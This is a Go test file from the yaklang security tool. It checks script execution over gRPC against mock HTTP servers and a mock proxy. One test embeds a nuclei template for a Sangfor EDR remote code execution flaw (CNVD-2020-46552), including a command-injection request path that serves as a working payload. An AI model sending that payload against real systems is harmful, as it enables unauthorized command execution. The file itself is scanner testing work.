package yakgrpc

import (
	"context"
	"fmt"
	"testing"

	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/require"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
)

func init() {
	consts.GetGormProfileDatabase()
	consts.GetGormProjectDatabase()
}

func TestGRPCMUSTPASS_LANGUAGE_EXEC_YAK_SCRIPT(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		panic(err)
	}
	name, clearFunc, err := yakit.CreateTemporaryYakScriptEx("nuclei", `id: CNVD-2020-46552

info:
  name: Sangfor EDR - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could execute arbitrary commands on the target host.
  reference:
    - https://www.modb.pro/db/144475
    - https://blog.csdn.net/bigblue00/article/details/108434009
    - https://cn-sec.com/archives/721509.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: cnvd,cnvd2020,sangfor,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "$show_input = function($info)")'
          - 'contains(body, "$strip_slashes($host)")'
          - 'contains(body, "Log Helper")'
          - 'status_code == 200'
        condition: and

# Enhanced by mp on 2022/05/18
`)
	require.NoError(t, err)
	defer clearFunc()
	host, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n\r\nHello, world!"))

	stream, err := client.ExecYakScript(context.Background(), &ypb.ExecRequest{
		ScriptId: name,
		Params: []*ypb.ExecParamItem{
			{Key: "target", Value: fmt.Sprintf("http://%s:%d", host, port)},
		},
	})
	require.NoError(t, err)
	for {
		data, err := stream.Recv()
		if err != nil {
			break
		}
		spew.Dump(data)
	}
}

func TestGRPCMUSTPASS_LANGUAGE_NesureProxyValidInExecBatchYakScript(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		panic(err)
	}
	name, clearFunc, err := yakit.CreateTemporaryYakScriptEx("mitm", `
mirrorHTTPFlow = func(isHttps, url , req , rsp , body ) {
    	poc.HTTP(req,poc.https(isHttps),poc.replaceQueryParam("key", "1"))
}
`)
	require.NoError(t, err)
	defer clearFunc()
	count := 0
	host, port := utils.DebugMockHTTPKeepAliveEx(func(req []byte) []byte {
		r, _ := lowhttp.ParseBytesToHttpRequest(req)
		if r.Method == "CONNECT" {
			return []byte("HTTP/1.0 200 Connection established\r\n\r\n")
		}
		if keys, ok := r.URL.Query()["key"]; ok && keys[0] == "1" {
			count++
		}
		return []byte("HTTP/1.1 200 OK\r\n\r\nHello, world!")
	})
	// host, port := utils.DebugMockTCPEx(func(ctx context.Context, lis net.Listener, conn net.Conn) {
	// 	for {
	// 		bytes, err := utils.ReadConnWithTimeout(conn, 5*time.Second)
	// 		if err != nil {
	// 			break
	// 		}
	// 		r, err := lowhttp.ParseBytesToHttpRequest(bytes)
	// 		if err != nil {
	// 			break
	// 		}
	// 		spew.Dump(bytes)

	// 		if r.Method == "CONNECT" {
	// 			conn.Write([]byte("HTTP/1.0 200 Connection established\r\n\r\n"))
	// 			continue
	// 		}

	// 		if keys, ok := r.URL.Query()["key"]; ok && keys[0] == "1" {
	// 			count++
	// 		}
	// 		conn.Write([]byte("HTTP/1.1 200 OK\r\n\r\nHello, world!"))
	// 	}
	// })

	stream, err := client.ExecBatchYakScript(context.Background(), &ypb.ExecBatchYakScriptRequest{
		Target:              "http://www.baidu.com?key=0",
		ScriptNames:         []string{name},
		Limit:               10,
		TotalTimeoutSeconds: 1000,
		Concurrent:          4,
		Proxy:               fmt.Sprintf("http://%s:%d", host, port),
	})
	require.NoError(t, err)
	for {
		_, err := stream.Recv()
		if err != nil {
			break
		}
	}
	require.Greater(t, count, 0, "want more than 1, but got %d", count)
}
